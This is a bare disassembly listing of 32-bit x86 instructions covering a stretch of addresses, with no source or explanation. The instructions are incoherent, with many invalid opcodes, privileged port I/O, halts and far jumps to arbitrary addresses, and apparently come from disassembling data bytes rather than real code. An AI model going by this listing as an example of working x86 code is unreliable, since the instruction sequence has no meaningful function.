  416d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d51:	add    eax,0x1615a914
  416d56:	mov    DWORD PTR [ebp+eax*2+0x3d],esp
  416d5a:	and    BYTE PTR [ecx-0xb7969f9],0xf1
  416d61:	and    esi,DWORD PTR [ebp+0x36c3cce2]
  416d67:	das    
  416d68:	mov    eax,ds:0xf88890da
  416d6d:	fnstsw WORD PTR [esi]
  416d6f:	int3   
  416d70:	mov    ecx,0x5d91031a
  416d75:	ins    DWORD PTR es:[edi],dx
  416d76:	jae    0x416d52
  416d78:	mov    WORD PTR [ecx+0x29],es
  416d7b:	pop    ebp
  416d7c:	cli    
  416d7d:	outs   dx,BYTE PTR ds:[esi]
  416d7e:	xchg   esp,eax
  416d7f:	retf   0x3392
  416d82:	popa   
  416d83:	inc    edx
  416d84:	mov    ds:0xdbb2b976,eax
  416d89:	js     0x416d50
  416d8b:	stc    
  416d8c:	mov    DWORD PTR [esi-0x14d5deb8],esi
  416d92:	shr    BYTE PTR [edx],cl
  416d94:	add    DWORD PTR [esi+0x3aae4da4],esp
  416d9a:	pushf  
  416d9b:	mov    ch,0x8e
  416d9d:	jl     0x416dc3
  416d9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416da0:	aam    0x1a
  416da2:	retf   
  416da3:	push   es
  416da4:	sti    
  416da5:	stos   BYTE PTR es:[edi],al
  416da6:	xchg   ebp,eax
  416da7:	jmp    0x416d7c
  416da9:	out    0xe8,eax
  416dab:	pop    esp
  416dac:	add    bl,dl
  416dae:	mov    ah,0xc2
  416db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416db1:	adc    bl,BYTE PTR [edx+0x2354865d]
  416db7:	gs (bad) 
  416db9:	ds push ebx
  416dbb:	xor    cl,bh
  416dbd:	ja     0x416d48
  416dbf:	into   
  416dc0:	inc    esi
  416dc1:	in     eax,dx
  416dc2:	adc    al,0xb8
  416dc4:	in     eax,dx
  416dc5:	mov    ebp,0x4518ddd6
  416dca:	cmp    ch,BYTE PTR [eax]
  416dcc:	xchg   esi,eax
  416dcd:	call   0x91b33459
  416dd2:	sub    edx,DWORD PTR [ecx+0x68566b22]
  416dd8:	pop    edx
  416dd9:	jl     0x416e41
  416ddb:	sub    dh,BYTE PTR [ebx-0x3e]
  416dde:	xlat   BYTE PTR ds:[ebx]
  416ddf:	push   ecx
  416de0:	mov    dl,0xe6
  416de2:	pusha  
  416de3:	pushf  
  416de4:	shl    DWORD PTR [ecx],1
  416de6:	and    edi,esp
  416de8:	rcl    ecx,0x2e
  416deb:	in     eax,0xc0
  416ded:	dec    ebx
  416dee:	fdivr  QWORD PTR [edi+0x23]
  416df1:	outs   dx,BYTE PTR ds:[esi]
  416df2:	imul   ebp,DWORD PTR [esi],0x42
  416df5:	outs   dx,DWORD PTR ds:[esi]
  416df6:	sub    DWORD PTR [ecx],ebx
  416df8:	daa    
  416df9:	std    
  416dfa:	sbb    ch,dl
  416dfc:	inc    ecx
  416dfd:	and    dh,BYTE PTR [edi+0x5b]
  416e00:	lock add DWORD PTR [esi+0x24a8f3de],ebp
  416e07:	mov    DWORD PTR [esi-0x4e],ecx
  416e0a:	shl    BYTE PTR [edx-0x7b603ea9],1
  416e10:	leave  
  416e11:	push   esi
  416e12:	enter  0xdbec,0xc
  416e16:	fwait
  416e17:	dec    esp
  416e18:	pop    ebp
  416e19:	outs   dx,BYTE PTR ds:[esi]
  416e1a:	js     0x416db9
  416e1c:	das    
  416e1d:	jl     0x416db2
  416e1f:	adc    bl,bl
  416e21:	cmp    DWORD PTR [eax],edx
  416e23:	iret   
  416e24:	ret    
  416e25:	clc    
  416e26:	and    dl,BYTE PTR [ebp+0x62094a6c]
  416e2c:	sub    BYTE PTR [ecx],dl
  416e2e:	mov    gs,WORD PTR [ecx]
  416e30:	mov    bl,0x1d
  416e32:	mov    ch,0x88
  416e34:	sub    DWORD PTR [ecx+0x4ba7ed81],edi
  416e3a:	test   eax,edi
  416e3c:	lods   eax,DWORD PTR ds:[esi]
  416e3d:	loope  0x416e51
  416e3f:	mov    bl,BYTE PTR [edi-0x78f27f1e]
  416e45:	jne    0x416e96
  416e47:	dec    edi
  416e48:	test   eax,0x99f3df2a
  416e4d:	push   esp
  416e4e:	daa    
  416e4f:	ins    DWORD PTR es:[edi],dx
  416e50:	inc    BYTE PTR [ebx+0x29]
  416e53:	or     bh,BYTE PTR [esi+0x1a]
  416e56:	sub    DWORD PTR [esi-0x7073d5a3],ebx
  416e5c:	jmp    0xb3f666ec
  416e61:	jge    0x416e10
  416e63:	dec    ebp
  416e64:	inc    edi
  416e65:	sbb    ebp,edx
  416e67:	mul    BYTE PTR [ebx]
  416e69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e6a:	fucompp 
  416e6c:	and    dl,BYTE PTR [esp+edx*2]
  416e6f:	stos   BYTE PTR es:[edi],al
  416e70:	icebp  
  416e71:	sahf   
  416e72:	rcr    ch,0x1b
  416e75:	mov    eax,ds:0x7858bf33
  416e7a:	shl    edi,0x4c
  416e7d:	in     al,0x15
  416e7f:	and    eax,0xecb23579
  416e84:	adc    al,0xa
  416e86:	mov    fs,ecx
  416e88:	out    dx,eax
  416e89:	out    dx,al
  416e8a:	pop    ebx
  416e8b:	xchg   esi,eax
  416e8c:	or     bh,dl
  416e8e:	mov    ecx,0xa5a7fcde
  416e93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e94:	cmp    eax,DWORD PTR [ecx+0x9]
  416e97:	call   0x10bf:0x3a780961
  416e9e:	adc    eax,0xaa3d17b4
  416ea3:	pop    ds
  416ea4:	mov    DWORD PTR [edx],ecx
  416ea6:	dec    ecx
  416ea7:	push   edx
  416ea8:	mov    ebp,0xfdc8001b
  416ead:	pop    ebx
  416eae:	aaa    
  416eaf:	in     al,dx
  416eb0:	jge    0x416e70
  416eb2:	mov    al,0xa3
  416eb4:	repz jns 0x416e5c
  416eb7:	(bad)  
  416eb9:	clc    
  416eba:	ror    al,0xb1
  416ebd:	mov    al,ds:0x4a1d633e
  416ec2:	or     al,0x44
  416ec4:	icebp  
  416ec5:	stos   DWORD PTR es:[edi],eax
  416ec6:	out    dx,al
  416ec7:	sbb    bl,al
  416ec9:	sar    BYTE PTR [ebx-0x64],0xef
  416ecd:	mov    ch,0xe3
  416ecf:	clc    
  416ed0:	shr    BYTE PTR [eax-0x80],cl
  416ed3:	and    DWORD PTR [ebp-0x4f],ecx
  416ed6:	sbb    edi,DWORD PTR [esi-0x204cae5]
  416edc:	sbb    BYTE PTR [edi+0x46],dl
  416edf:	outs   dx,DWORD PTR ds:[esi]
  416ee0:	adc    bh,cl
  416ee2:	pop    ebx
  416ee3:	xchg   esi,eax
  416ee4:	stos   DWORD PTR es:[edi],eax
  416ee5:	dec    edx
  416ee6:	cmp    BYTE PTR [ecx-0x24eb6a39],ch
  416eec:	adc    ebx,DWORD PTR [esi-0x22343645]
  416ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ef3:	aas    
  416ef4:	push   edi
  416ef5:	push   edi
  416ef6:	cld    
  416ef7:	push   eax
  416ef8:	aam    0xb2
  416efa:	dec    ebx
  416efb:	add    esp,ebp
  416efd:	scas   al,BYTE PTR es:[edi]
  416efe:	add    eax,0x35c7222c
  416f03:	cmovb  esi,DWORD PTR [esi+0x4e]
  416f07:	(bad)  
  416f08:	sbb    al,0xab
  416f0a:	cli    
  416f0b:	fld    QWORD PTR [ebp-0x240d2fe7]
  416f11:	(bad)
  416f14:	mov    ecx,edi
  416f16:	xor    al,ch
  416f18:	ror    DWORD PTR [ebp+0x7b],0x53
  416f1c:	or     ecx,ebp
  416f1e:	je     0x416f46
  416f20:	iret   
  416f21:	ror    BYTE PTR [edi+0x113c8f2c],cl
  416f27:	hlt    
  416f28:	int    0x2b
  416f2a:	pusha  
  416f2b:	jno    0x416f13
  416f2d:	sbb    DWORD PTR [ecx+ecx*4],esp
  416f30:	retf   
  416f31:	repz adc edx,0x6a
  416f35:	add    eax,0x8a3c0698
  416f3a:	mov    WORD PTR [esi],?
  416f3c:	fild   DWORD PTR [edi+0x20]
  416f3f:	call   0x806c738c
  416f44:	inc    edi
  416f45:	inc    ebx
  416f46:	inc    esi
  416f47:	repz mov cl,0x54
  416f4a:	ret    
  416f4b:	addr16 dec edi
  416f4d:	inc    ecx
  416f4e:	hlt    
  416f4f:	mov    ebp,0xffe30e83
  416f54:	scas   al,BYTE PTR es:[edi]
  416f55:	dec    ecx
  416f56:	dec    edi
  416f57:	mov    ah,0x4f
  416f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f5a:	adc    DWORD PTR [edi],ebp
  416f5c:	mov    edx,0x6e4c7943
  416f61:	retf   
  416f62:	(bad)  
  416f66:	(bad)  
  416f67:	or     DWORD PTR [ecx+0x7a],eax
  416f6a:	dec    esp
  416f6b:	scas   al,BYTE PTR es:[edi]
  416f6c:	repz sbb esi,DWORD PTR [ecx+eiz*8]
  416f70:	and    bl,BYTE PTR [ebx]
  416f72:	mov    eax,0xb9323c38
  416f77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f78:	imul   esi,DWORD PTR [edi+0x281e6914],0xf79bb3eb
  416f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f83:	popf   
  416f84:	icebp  
  416f85:	push   0xfffffff2
  416f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f88:	or     DWORD PTR [edi],ecx
  416f8a:	jg     0x416ff5
  416f8c:	push   esp
  416f8d:	fwait
  416f8e:	js     0x41700b
  416f90:	xor    eax,0x7814e0f5
  416f95:	es js  0x416fff
  416f98:	fs xor eax,0x4938c8f2
  416f9e:	(bad)  
  416fa0:	cli    
  416fa1:	test   eax,0xbbee928a
  416fa6:	sub    al,0x2a
  416fa8:	dec    ebx
  416fa9:	pop    edi
  416faa:	and    eax,DWORD PTR [edx+0x1e]
  416fad:	lods   al,BYTE PTR ds:[esi]
  416fae:	aaa    
  416faf:	jbe    0x416f9e
  416fb1:	out    dx,eax
  416fb2:	fnsave [edi-0x1314decb]
  416fb8:	or     al,0x7
  416fba:	sti    
  416fbb:	fsub   DWORD PTR [ebx+0x2ff07e51]
  416fc1:	loopne 0x417001
  416fc3:	jmp    0xdbde4222
  416fc8:	and    al,0x90
  416fca:	mov    bh,0x20
  416fcc:	and    al,0x45
  416fce:	pop    ss
  416fcf:	sub    DWORD PTR [esi+0x391c2950],esp
  416fd5:	(bad)  
  416fd7:	sub    BYTE PTR [ebp-0x207e1a94],ah
  416fdd:	push   0xffffffe0
  416fdf:	inc    eax
  416fe0:	lock ror ch,1
  416fe3:	addr16 js 0x417063
  416fe6:	inc    ebx
  416fe7:	fdivrp st(0),st
  416fe9:	jp     0x416ff4
  416feb:	rcr    ebx,cl
  416fed:	adc    DWORD PTR [eax+ecx*8],0x41
  416ff1:	sbb    ah,BYTE PTR [edi]
  416ff3:	jae    0x416fe7
  416ff5:	pushw  0x3651
  416ff9:	icebp  
  416ffa:	jmp    0xe763:0xcaab4abb
  417001:	adc    esi,DWORD PTR [esi]
  417003:	arpl   WORD PTR [eax],sp
  417005:	jmp    0x416fc2
  417007:	ins    BYTE PTR es:[edi],dx
  417008:	jns    0x417082
  41700a:	mov    edx,0xe4ddfddd
  41700f:	stc    
  417010:	imul   ebp,DWORD PTR [ebx+0x14],0x1c8e2a63
  417017:	inc    edi
  417018:	(bad)  
  417019:	mov    cl,0xa3
  41701b:	push   ds
  41701c:	gs hlt 
  41701e:	mov    al,0x1
  417020:	jl     0x416fc6
  417022:	rcl    DWORD PTR [edx-0x7d],0xb1
  417026:	pop    ebp
  417027:	bound  ebp,QWORD PTR [edx-0x20]
  41702a:	adc    BYTE PTR [ecx],0x44
  41702d:	test   edx,edx
  41702f:	pushf  
  417030:	cmp    esp,ecx
  417032:	in     eax,0x4c
  417034:	xor    BYTE PTR [ecx+0x72a36359],0x93
  41703b:	and    eax,0x35302186
  417040:	out    dx,eax
  417041:	in     eax,dx
  417042:	xchg   DWORD PTR [ebp+0x39],edx
  417045:	jge    0x416fe9
  417047:	jl     0x416ff7
  417049:	ins    DWORD PTR es:[edi],dx
  41704a:	outs   dx,DWORD PTR es:[esi]
  41704c:	sub    eax,0x44d050b6
  417051:	push   ebx
  417052:	lahf   
  417053:	data16 adc al,0xb4
  417056:	sub    eax,0x5a7d75ed
  41705b:	loop   0x417093
  41705d:	mov    es,WORD PTR [ebx+0x65380a7]
  417063:	push   ebp
  417064:	xor    BYTE PTR [ebx],ch
  417066:	adc    edi,esp
  417068:	sub    eax,0xbc5a1e7d
  41706d:	push   ebp
  41706e:	dec    edx
  41706f:	dec    esp
  417070:	xor    BYTE PTR [ebp-0x6f],cl
  417073:	push   ebp
  417074:	xlat   BYTE PTR ds:[ebx]
  417075:	jmp    0xfc26b738
  41707a:	or     bl,BYTE PTR ds:0xcedfa957
  417080:	and    dl,BYTE PTR ds:0x1d8c070a
  417086:	jns    0x417097
  417088:	cli    
  417089:	jnp    0x4170c6
  41708b:	lea    ebx,[ebp-0x79]
  41708e:	and    ecx,DWORD PTR [eax+0x4c9c6c98]
  417094:	jno    0x417028
  417096:	dec    edi
  417097:	ficomp WORD PTR [edi+ebp*2]
  41709a:	popa   
  41709b:	push   ds
  41709c:	stos   DWORD PTR es:[edi],eax
  41709d:	pop    eax
  41709e:	fsubrp st(2),st
  4170a0:	dec    eax
  4170a1:	std    
  4170a2:	push   edi
  4170a3:	and    DWORD PTR [esi],eax
  4170a5:	push   edi
  4170a6:	sahf   
  4170a7:	aad    0xf0
  4170a9:	mov    eax,ds:0xd1107205
  4170ae:	cs sub dl,dh
  4170b1:	xor    edx,DWORD PTR [edi]
  4170b3:	jae    0x41706b
  4170b5:	push   ds
  4170b6:	add    eax,0xd5b51905
  4170bb:	push   esi
  4170bc:	js     0x4170b7
  4170be:	push   ecx
  4170bf:	mov    edi,0xcdd4b6a6
  4170c4:	dec    esp
  4170c5:	clc    
  4170c6:	out    dx,al
  4170c7:	jmp    0x4832ea95
  4170cc:	xlat   BYTE PTR ds:[ebx]
  4170cd:	popa   
  4170ce:	outs   dx,DWORD PTR ds:[esi]
  4170cf:	shr    eax,1
  4170d1:	push   eax
  4170d2:	je     0x4170f9
  4170d4:	inc    ebx
  4170d5:	inc    esi
  4170d6:	inc    esi
  4170d7:	xlat   BYTE PTR ds:[ebx]
  4170d8:	pop    edx
  4170d9:	sbb    DWORD PTR [esi+ebx*8-0x1f645df],ecx
  4170e0:	jae    0x417117
  4170e2:	sbb    edi,DWORD PTR [ebp-0x58]
  4170e5:	xor    ecx,DWORD PTR [eax-0x6]
  4170e8:	ins    DWORD PTR es:[edi],dx
  4170e9:	lahf   
  4170ea:	xchg   BYTE PTR [ecx],cl
  4170ec:	les    esi,FWORD PTR [eax+0x1b]
  4170ef:	adc    eax,0xe37260
  4170f4:	test   BYTE PTR [eax-0xf],0x89
  4170f8:	addr16 pop edx
  4170fa:	fucomip st,st(6)
  4170fc:	mov    ch,0x99
  4170fe:	hlt    
  4170ff:	cmc    
  417100:	pop    es
  417101:	test   eax,0xdecc79dd
  417106:	add    cl,BYTE PTR [edx+0x193f2510]
  41710c:	dec    ebp
  41710d:	popa   
  41710e:	mov    eax,ds:0xd9baf840
  417113:	leave  
  417114:	cmp    DWORD PTR [ebx-0x3c],esi
  417117:	add    bh,dh
  417119:	pop    esi
  41711a:	dec    eax
  41711b:	neg    DWORD PTR [eax]
  41711d:	sti    
  41711e:	fsub   DWORD PTR [ebx-0xd]
  417121:	in     eax,dx
  417122:	retf   0xd54d
  417125:	stos   DWORD PTR es:[edi],eax
  417126:	pop    eax
  417127:	mov    edx,0x990254ff
  41712c:	outs   dx,DWORD PTR ds:[esi]
  41712d:	test   DWORD PTR [edi],0x21fd6d07
  417133:	aad    0x8f
  417135:	icebp  
  417136:	mov    edi,0xdc604f5e
  41713b:	sahf   
  41713c:	mov    bh,0x3a
  41713e:	cmp    al,0x47
  417140:	jl     0xae2e1e8f
  417146:	cmp    esi,DWORD PTR [edx]
  417148:	push   0xffffffbc
  41714a:	xor    esp,esp
  41714c:	scas   al,BYTE PTR es:[edi]
  41714d:	mov    dh,0xbe
  41714f:	push   esp
  417150:	out    dx,al
  417151:	ins    BYTE PTR es:[edi],dx
  417152:	or     DWORD PTR [eax],ecx
  417154:	xor    DWORD PTR [ebx-0x6c6378e1],ebx
  41715a:	lea    ebp,[ecx]
  41715c:	stc    
  41715d:	adc    eax,0xfb6db400
  417162:	xchg   BYTE PTR [eax+edx*8+0x1e9555fd],ch
  417169:	inc    ebx
  41716a:	fwait
  41716b:	jnp    0x4171dd
  41716d:	popa   
  41716e:	leave  
  41716f:	(bad)  
  417171:	enter  0xd950,0x2d
  417175:	cmp    al,0x72
  417177:	jg     0x417147
  417179:	jb     0x41718d
  41717b:	mov    bh,0x1e
  41717d:	fld    TBYTE PTR [esi+0x46]
  417180:	not    ebx
  417182:	xor    ebx,DWORD PTR [eax]
  417184:	ja     0x4171d4
  417186:	in     al,0xf8
  417188:	scas   eax,DWORD PTR es:[edi]
  417189:	xchg   edi,eax
  41718a:	add    eax,0x295a266
  41718f:	sahf   
  417190:	jle    0x417184
  417192:	(bad)  
  417193:	mov    eax,0xf62308a9
  417198:	adc    al,0xa7
  41719a:	ret    0xe8
  41719d:	and    BYTE PTR [ecx],bl
  41719f:	mov    eax,0x9e608657
  4171a4:	pusha  
  4171a5:	arpl   WORD PTR [eax+0x29d3b37c],si
  4171ab:	(bad)  
  4171ac:	ret    0x1f8a
  4171af:	or     ch,al
  4171b1:	aaa    
  4171b2:	lock out 0xf1,al
  4171b5:	in     eax,0xff
  4171b7:	mov    ss,ebp
  4171b9:	arpl   WORD PTR [eax-0x420944ce],cx
  4171bf:	hlt    
  4171c0:	(bad)  
  4171c1:	jnp    0x4171ac
  4171c3:	aam    0xb2
  4171c5:	xor    BYTE PTR [ecx+edx*8-0x3334706d],0x65
  4171cd:	cmp    BYTE PTR [esi+0x510465ab],cl
  4171d3:	mov    edi,0x3b9d886d
  4171d8:	cwde   
  4171d9:	push   ebx
  4171da:	daa    
  4171db:	mov    cl,cl
  4171dd:	pop    es
  4171de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171df:	push   ebp
  4171e0:	cmp    eax,0xca35e146
  4171e5:	lods   al,BYTE PTR ds:[esi]
  4171e6:	mov    eax,0x54adb73a
  4171eb:	xor    eax,ebx
  4171ed:	test   al,0x17
  4171ef:	cmp    dh,ah
  4171f1:	pop    ds
  4171f2:	fucomp st(3)
  4171f4:	mov    ebx,0xaa338d77
  4171f9:	jne    0x4171be
  4171fb:	jbe    0x417240
  4171fd:	lods   eax,DWORD PTR ds:[esi]
  4171fe:	or     dh,BYTE PTR [esi-0x45]
  417201:	jge    0x41722f
  417203:	xchg   edx,eax
  417204:	sub    DWORD PTR [edi-0x41],ebp
  417207:	and    BYTE PTR [ebx],bl
  417209:	cmp    al,0x78
  41720b:	cmp    eax,0x39b36bd2
  417210:	xor    DWORD PTR [esi-0x47],0x6de8bb5e
  417217:	mov    dh,0x2b
  417219:	aaa    
  41721a:	icebp  
  41721b:	or     al,0x1c
  41721d:	leave  
  41721e:	mov    bl,0xa6
  417220:	pop    ds
  417221:	test   al,0x90
  417223:	mov    eax,0xf320d3ee
  417228:	fdivr  QWORD PTR [edi]
  41722a:	stc    
  41722b:	int    0x68
  41722d:	push   esi
  41722e:	in     al,0xd8
  417230:	mov    ebx,0xd58a49b6
  417235:	xor    BYTE PTR [ecx+0x1d2faeb0],0x95
  41723c:	sbb    BYTE PTR [eax+0x59ed74b6],dh
  417242:	mov    eax,0x3a08e207
  417247:	int    0x3b
  417249:	sbb    DWORD PTR [ebx+0x77],edi
  41724c:	loop   0x41723b
  41724e:	add    esi,DWORD PTR [eax-0x498e2a69]
  417254:	jne    0x417212
  417256:	stos   BYTE PTR es:[edi],al
  417257:	inc    esi
  417258:	data16 scas al,BYTE PTR es:[edi]
  41725a:	lods   eax,DWORD PTR ds:[esi]
  41725b:	clc    
  41725c:	jg     0x4171f0
  41725e:	pusha  
  41725f:	push   edi
  417260:	ror    al,1
  417262:	mov    ah,0x75
  417264:	or     bh,BYTE PTR [ebx+0x37]
  417267:	jno    0x4172b0
  417269:	fs (bad) 
  41726b:	xor    DWORD PTR ds:[edi+0x51a07ee7],esp
  417272:	or     eax,0x4e6cb831
  417277:	int3   
  417278:	jmp    0x41724b
  41727a:	mov    ah,BYTE PTR [edi+0x30a0f2c0]
  417280:	(bad)  
  417281:	dec    edi
  417282:	jbe    0x4172f6
  417284:	ret    
  417285:	out    dx,al
  417286:	adc    BYTE PTR [ecx-0x2042b6ac],0x3b
  41728d:	fwait
  41728e:	sbb    DWORD PTR [ecx+esi*1+0x61],ebx
  417292:	mov    esp,eax
  417294:	cmp    ah,BYTE PTR ds:0x68fea4fe
  41729a:	push   esi
  41729b:	imul   esi,DWORD PTR [esp+edi*4+0x4d],0xfffffff7
  4172a0:	sbb    al,0x81
  4172a2:	sub    al,0xbc
  4172a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172a5:	inc    esi
  4172a6:	les    edx,FWORD PTR [edx+0x21]
  4172a9:	inc    edi
  4172aa:	push   esp
  4172ab:	sbb    al,0xe8
  4172ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172ae:	scas   eax,DWORD PTR es:[edi]
  4172af:	mov    edx,0xdba4114f
  4172b4:	in     eax,dx
  4172b5:	and    esi,edi
  4172b7:	sbb    bh,ch
  4172b9:	xchg   ebx,eax
  4172ba:	fld    DWORD PTR [edi+edx*2]
  4172bd:	cdq    
  4172be:	push   0xffffffda
  4172c0:	jns    0x4172aa
  4172c2:	mov    ds:0xf446fc2,al
  4172c7:	call   0xfc0f0ea
  4172cc:	inc    edi
  4172cd:	rol    DWORD PTR [ebp-0x7d345f0e],1
  4172d3:	stos   BYTE PTR es:[edi],al
  4172d4:	add    eax,0xc14a9bde
  4172d9:	cmp    al,0x45
  4172db:	xchg   ebx,eax
  4172dc:	and    cl,bh
  4172de:	xor    BYTE PTR [ecx-0x46],ch
  4172e1:	in     eax,0x47
  4172e3:	ss sahf 
  4172e5:	ret    
  4172e6:	inc    ebp
  4172e7:	ret    0xb592
  4172ea:	mov    ah,BYTE PTR [ebp-0x47]
  4172ed:	jae    0x4172b3
  4172ef:	or     DWORD PTR [ecx-0x3e],edi
  4172f2:	or     esp,0xac09bc66
  4172f8:	adc    esp,DWORD PTR ds:0xc7fad6cd
  4172fe:	test   BYTE PTR [eax],bh
  417300:	pop    edx
  417301:	mov    ecx,0xb9710391
  417306:	sbb    ecx,DWORD PTR [ecx+esi*1+0x8]
  41730a:	cwde   
  41730b:	jmp    0x41735e
  41730d:	mov    dl,ah
  41730f:	jmp    0x822d:0x2d80403c
  417316:	jmp    0x41738b
  417318:	inc    edx
  417319:	mov    esp,0xb57f7ee8
  41731e:	pop    edx
  41731f:	outs   dx,BYTE PTR ds:[esi]
  417320:	jecxz  0x417302
  417322:	xor    DWORD PTR [ecx-0x1f89ffc],0x16dcd5ef
  41732c:	and    DWORD PTR [bp+0xe],ebp
  417330:	add    eax,0xde4796b5
  417335:	add    al,BYTE PTR [ebp+0x12ca209e]
  41733b:	xlat   BYTE PTR ds:[ebx]
  41733c:	out    0xf4,eax
  41733e:	or     ch,BYTE PTR [eax-0x763a9455]
  417344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417345:	rcl    esi,0x22
  417348:	push   eax
  417349:	cmc    
  41734a:	aam    0x74
  41734c:	test   BYTE PTR [ebp+0x17ef1d0b],dh
  417352:	daa    
  417353:	and    dl,0x86
  417356:	push   es
  417357:	mov    eax,0xc94ee56b
  41735c:	mov    dl,0x99
  41735e:	gs add al,0x7b
  417361:	xchg   ebx,eax
  417362:	lea    eax,[edx]
  417364:	fwait
  417365:	xchg   BYTE PTR [ebp-0x32618d12],ch
  41736b:	jno    0x4173a1
  41736d:	in     al,0xba
  41736f:	mov    ebx,0xa4a5e1b6
  417374:	and    ebx,ecx
  417376:	imul   esi,DWORD PTR ds:0x7740b680,0x9671c379
  417380:	inc    eax
  417381:	bound  esi,QWORD PTR [edi+edx*8]
  417384:	imul   eax,DWORD PTR [edx+0x7c],0x1a
  417388:	mov    ds:0x3d924e,al
  41738d:	xchg   ebp,eax
  41738e:	fwait
  41738f:	push   esi
  417390:	cs cdq 
  417392:	dec    ebp
  417393:	mov    BYTE PTR [esi],0x38
  417396:	es pop edx
  417398:	lds    ebp,FWORD PTR [ebx+0x38]
  41739b:	adc    ebx,esi
  41739d:	(bad)  
  41739e:	push   cs
  41739f:	sub    edi,edx
  4173a1:	call   0x1637:0x192eeed6
  4173a8:	icebp  
  4173a9:	sub    al,0xb5
  4173ab:	cmp    eax,0x20341c2d
  4173b0:	mov    BYTE PTR [edx+ecx*8-0x6b],bl
  4173b4:	neg    dh
  4173b6:	push   edx
  4173b7:	pop    ecx
  4173b8:	das    
  4173b9:	sbb    BYTE PTR [ebp-0x35],bl
  4173bc:	mov    esp,0x727ac2f6
  4173c1:	pop    edx
  4173c2:	jle    0x417392
  4173c4:	scas   eax,DWORD PTR es:[edi]
  4173c5:	scas   eax,DWORD PTR es:[edi]
  4173c6:	xor    al,0x63
  4173c8:	pop    ebx
  4173c9:	cli    
  4173ca:	cmc    
  4173cb:	pushf  
  4173cc:	mov    edi,0xad0450ce
  4173d1:	es pop ebp
  4173d3:	in     al,dx
  4173d4:	xor    ebp,esi
  4173d6:	mov    esp,0x8425eaf9
  4173db:	mov    eax,ecx
  4173dd:	sbb    ebp,DWORD PTR [edi+0xe]
  4173e0:	and    eax,0xe4d4aae0
  4173e5:	jmp    0x5fb9:0x7718be2b
  4173ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173ed:	cli    
  4173ee:	mov    eax,ds:0x54be28f9
  4173f3:	mov    esp,0x6d31428a
  4173f8:	(bad)  
  4173f9:	fmul   QWORD PTR [ecx]
  4173fb:	cmp    al,0xe3
  4173fd:	scas   al,BYTE PTR es:[edi]
  4173fe:	xchg   edi,eax
  4173ff:	mov    ds:0x69b63660,eax
  417404:	cld    
  417405:	sub    DWORD PTR [esi+0x78],esp
  417408:	retf   
  417409:	cmp    al,0x6c
  41740b:	inc    edi
  41740c:	push   cs
  41740d:	lods   eax,DWORD PTR ds:[esi]
  41740e:	aaa    
  41740f:	mov    edx,0x1bb2c7f4
  417414:	sahf   
  417415:	test   al,0x6e
  417417:	push   esi
  417418:	or     eax,0xf5748ee0
  41741d:	push   ebx
  41741e:	xor    eax,esi
  417420:	pusha  
  417421:	stc    
  417422:	stos   DWORD PTR es:[edi],eax
  417423:	cmp    eax,esi
  417425:	or     DWORD PTR ds:0x66fb0481,0xf07875ea
  41742f:	adc    eax,0xcd3697f8
  417434:	mov    ch,dl
  417436:	jne    0x417438
  417438:	jb     0x4173e5
  41743a:	adc    al,0xde
  41743c:	repnz mov al,ds:0x278fcf90
  417442:	xlat   BYTE PTR ds:[ebx]
  417443:	sub    eax,0x28e5dced
  417448:	xchg   edi,eax
  417449:	repz or esi,DWORD PTR [edi+edx*4]
  41744d:	pusha  
  41744e:	sbb    eax,0xb5138ffc
  417453:	xchg   esi,eax
  417454:	retf   0x9918
  417457:	retf   
  417458:	add    al,BYTE PTR [edx-0x59]
  41745b:	mov    al,ds:0xfd32b662
  417460:	sahf   
  417461:	loop   0x4174b3
  417463:	xchg   ecx,eax
  417464:	or     al,0xe0
  417466:	retf   0x4b52
  417469:	add    dl,ch
  41746b:	test   DWORD PTR [edx-0x5d],ecx
  41746e:	jp     0x417414
  417470:	push   edx
  417471:	fisttp DWORD PTR [edi+0x43fba3e8]
  417477:	push   ss
  417478:	je     0x417473
  41747a:	add    esp,DWORD PTR [edx-0x63]
  41747d:	xor    edi,ebx
  41747f:	add    esi,edi
  417481:	mov    eax,ss:0x22c89a16
  417487:	jbe    0x4174dc
  417489:	mov    eax,0x8514b84d
  41748e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41748f:	arpl   WORD PTR [ecx-0x3ed2fe38],sp
  417495:	dec    esi
  417496:	xlat   BYTE PTR ds:[ebx]
  417497:	inc    ebx
  417498:	mov    ebp,0xf1b2efdf
  41749d:	pop    ecx
  41749e:	pop    ecx
  41749f:	mov    WORD PTR [edx-0x8b3f28a],?
  4174a5:	fs stos DWORD PTR es:[edi],eax
  4174a7:	and    eax,0xef28bb7d
  4174ac:	xor    BYTE PTR [edi+esi*2-0x3c],0xe2
  4174b1:	mov    bh,0x7a
  4174b3:	xor    bl,dl
  4174b5:	push   ss
  4174b6:	lods   al,BYTE PTR ds:[esi]
  4174b7:	xor    DWORD PTR [edx+0x17df3f],edx
  4174bd:	cmp    al,BYTE PTR [edx+0x15]
  4174c0:	aad    0x46
  4174c2:	ror    BYTE PTR [esi+0x5297dc50],1
  4174c8:	ret    0x8ca5
  4174cb:	(bad)  
  4174cc:	xor    DWORD PTR [esi-0x24],ebx
  4174cf:	ret    0x1144
  4174d2:	pop    eax
  4174d3:	xlat   BYTE PTR ds:[ebx]
  4174d4:	xor    DWORD PTR [edi+edi*8],esi
  4174d7:	xchg   esp,eax
  4174d8:	and    edx,DWORD PTR [ecx]
  4174da:	mov    ebx,0xdcca20d0
  4174df:	int3   
  4174e0:	push   cs
  4174e1:	add    ebx,esp
  4174e3:	cmp    edx,DWORD PTR [edi-0x1807d774]
  4174e9:	mov    eax,ds:0x673970a
  4174ee:	push   esi
